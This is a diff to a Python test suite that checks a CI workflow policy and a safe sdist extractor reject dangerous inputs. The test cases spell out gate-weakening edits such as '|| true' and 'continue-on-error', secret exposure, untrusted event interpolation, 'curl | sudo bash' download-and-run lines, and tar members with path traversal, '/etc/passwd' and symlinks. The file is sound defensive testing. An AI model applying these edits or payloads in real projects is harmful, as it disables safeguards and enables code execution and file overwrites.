@@ -140,6 +140,25 @@ def test_workflow_policy_rejects_meaningful_gate_weakening():
          "\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n  package:\n"),
         ("release.yml", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "      - uses: "),
+        # A required step present as text but inert: its failure discarded
+        # by a shell softener, by continue-on-error, or by a step-level if.
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: uv run --locked pytest -q || true"),
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: uv run --locked pytest -q || exit 0"),
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: uv run --locked pytest -q || :"),
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: |\n          set +e\n          uv run --locked pytest -q"),
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: uv run --locked pytest -q\n        continue-on-error: true"),
+        ("quality.yml", "      - run: uv run --locked pytest -q",
+         "      - run: uv run --locked pytest -q\n        if: false"),
+        ("release.yml", "      - run: python scripts/wheel_smoke.py dist",
+         "      - run: python scripts/wheel_smoke.py dist\n        continue-on-error: true"),
+        # A stored secret reachable by every job through a top-level env.
+        ("release.yml", "permissions:\n  contents: read\n",
+         "env:\n  TOKEN: ${{ secrets.PYPI_TOKEN }}\npermissions:\n  contents: read\n"),
     ]
 
     for filename, original, weakened in mutations:
@@ -240,6 +259,25 @@ def test_workflow_policy_ignores_comments_and_checks_every_workflow_file(tmp_pat
          "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
          "        with:\n          arg: ${{ github.event.pull_request.title }}\n",
          "untrusted expression"),
+        # Wrapped in a function call, the value is still the attacker's.
+        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
+         "      - run: echo ${{ toJSON(github.event.pull_request) }}\n",
+         "untrusted expression"),
+        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
+         "      - run: echo ${{ format('{0}', inputs.name) }}\n",
+         "untrusted expression"),
+        # The whole event object (title, body, branch names inside).
+        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
+         "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
+         "        with:\n          a: ${{ toJSON(github.event) }}\n",
+         "untrusted expression"),
+        # A download piped through sudo or env into a shell.
+        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
+         "      - run: curl -sSf https://x/i.sh | sudo bash\n", "pipes a download"),
+        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
+         "      - run: wget -qO- https://x/i.sh | env FOO=1 sh -s\n", "pipes a download"),
+        # A stored secret in any workflow, at any level.
+        ("on: push\nenv:\n  T: ${{ secrets.TOKEN }}\njobs: {}\n", "stored secret"),
     ):
         variant = dict(workflows)
         variant["extra.yml"] = text
@@ -312,3 +350,54 @@ def test_distribution_home_path_scan_reaches_every_archive_layer(tmp_path, monke
     with pytest.raises(SystemExit) as info:
         dist._check_no_local_paths_in_zip(wheel_bytes(b"0123456789"), "asset.whl", "sdist")
     assert "refusing to inflate" in str(info.value)
+
+
+def test_plugin_smoke_sdist_extraction_refuses_unsafe_members_and_extracts_safe_ones(tmp_path):
+    """The temporary Codex lifecycle probe extracts the sdist it just built.
+    Extraction must refuse absolute (POSIX or Windows), backslashed, or
+    parent-escaping member names, links and devices, and dotenv paths — and
+    must actually run on a well-formed archive (a bughunt found the guard
+    referenced an undefined name, so the probe crashed on its first member)."""
+    import io
+    import tarfile
+
+    from scripts import plugin_smoke
+
+    def sdist_with(*names: str, kind: str = "file") -> Path:
+        archive_path = tmp_path / f"{abs(hash(names))}.tar.gz"
+        with tarfile.open(archive_path, "w:gz") as archive:
+            info = tarfile.TarInfo("glossabet-0.0.0/README.md")
+            info.size = 2
+            archive.addfile(info, io.BytesIO(b"ok"))
+            for name in names:
+                member = tarfile.TarInfo(name)
+                if kind == "symlink":
+                    member.type = tarfile.SYMTYPE
+                    member.linkname = "README.md"
+                else:
+                    member.size = 1
+                archive.addfile(member, None if kind == "symlink" else io.BytesIO(b"x"))
+        return archive_path
+
+    root = plugin_smoke._extract_sdist(sdist_with("glossabet-0.0.0/src/a.py"), tmp_path / "ok")
+    assert root == tmp_path / "ok" / "glossabet-0.0.0"
+    assert (root / "src" / "a.py").read_bytes() == b"x"
+
+    for name, expected in (
+        ("/etc/passwd", "unsafe path"),
+        ("C:/Windows/x", "unsafe path"),
+        ("C:\\Windows\\x", "unsafe path"),
+        ("\\\\server\\share\\x", "unsafe path"),
+        ("glossabet-0.0.0/../escape.py", "unsafe path"),
+        ("glossabet-0.0.0/sub\\dir/x", "unsafe path"),
+        ("glossabet-0.0.0/.env", "forbidden dotenv path"),
+        ("glossabet-0.0.0/config/.env.local", "forbidden dotenv path"),
+    ):
+        with pytest.raises(RuntimeError) as info:
+            plugin_smoke._extract_sdist(sdist_with(name), tmp_path / "bad")
+        assert expected in str(info.value), name
+    with pytest.raises(RuntimeError) as info:
+        plugin_smoke._extract_sdist(
+            sdist_with("glossabet-0.0.0/link", kind="symlink"), tmp_path / "link"
+        )
+    assert "link/device" in str(info.value)
